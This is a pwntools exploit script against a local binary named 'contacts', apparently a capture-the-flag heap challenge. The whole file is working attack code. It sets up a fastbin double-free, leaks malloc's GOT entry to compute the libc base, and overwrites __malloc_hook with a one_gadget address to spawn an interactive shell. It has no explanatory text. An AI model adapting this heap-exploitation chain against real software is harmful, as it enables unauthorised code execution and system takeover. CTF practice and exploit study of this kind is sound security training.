from pwn import *

e = ELF("./contacts")
libc = ELF("./libc.so.6")
p = process(e.path, env={"LD_PRELOAD": libc.path})

def alloc(p, name):
  p.clean()
  p.sendline("create {}".format(name))
  print("Created {}".format(name))

def alloc_bio(p, name, size, val="ASDF"):
  p.clean()
  p.sendline("bio {}".format(name))
  p.sendafter("How long will the bio be?", str(size - 1).rjust(3, "0"))
  p.sendlineafter("Enter your new bio:", val)
  print("Allocated {} with size {} and value {}".format(name, size, val))
 
def free(p, name):
  p.clean()
  p.sendline("bio {}".format(name))
  p.sendafter("How long will the bio be?", "999")

alloc(p, "A")
alloc(p, "B")
alloc(p, "C")
alloc(p, "A2")
alloc(p, "B2")
alloc(p, "C2")
alloc(p, "D2")
alloc(p, "A3")
alloc(p, "B3")
alloc(p, "C3")


alloc_bio(p, "A", 16)
alloc_bio(p, "B", 16)
alloc_bio(p, "C", 16)

free(p, "A")
free(p, "B")
free(p, "A")

# 2 malloc calls happen here
alloc(p, "D")

# This assumes e.got["malloc"] starts with a null byte (highest order byte is null)
alloc_bio(p, "D", 16, p64(e.got["malloc"]) + p64(e.got["malloc"])[:-1])

print("Got entry for malloc {}".format(hex(e.got["malloc"])))

p.clean()
p.sendline("display")

p.recvuntil("C3 - ")
p.recvuntil(" - ")
leak = u64(p.recvline(keepends=False).ljust(8, "\x00"))
print("Leak {}".format(hex(leak)))

libc_base = leak - libc.symbols["malloc"]
print("Libc Base {}".format(hex(libc_base)))
print("Malloc Hook {}".format(hex(libc_base + libc.symbols["__malloc_hook"])))

header_offset = libc_base + 0x7fe9eb5a1af5 - 0x7fe9eb1dd000

fake_size = 0x68

alloc_bio(p, "A2", fake_size)
alloc_bio(p, "B2", fake_size)
alloc_bio(p, "C2", fake_size)

free(p, "A2")
free(p, "B2")
free(p, "A2")

print("Fwd pointer written at {}".format(hex(header_offset - 8)))
alloc_bio(p, "A3", fake_size, p64(header_offset - 8))
alloc_bio(p, "B3", fake_size)
alloc_bio(p, "C3", fake_size)

one_gadget = libc_base + 0xf1147
print("One gadget {}".format(hex(one_gadget)))
print("Contacts {}".format(hex(e.symbols["contacts"])))
alloc_bio(p, "D2", fake_size, "A"* (3 + 8 * 2) + p64(one_gadget))

p.clean()
p.sendline("bio A")
p.sendlineafter("?", str(0x30).rjust(3, "0"))

p.interactive()
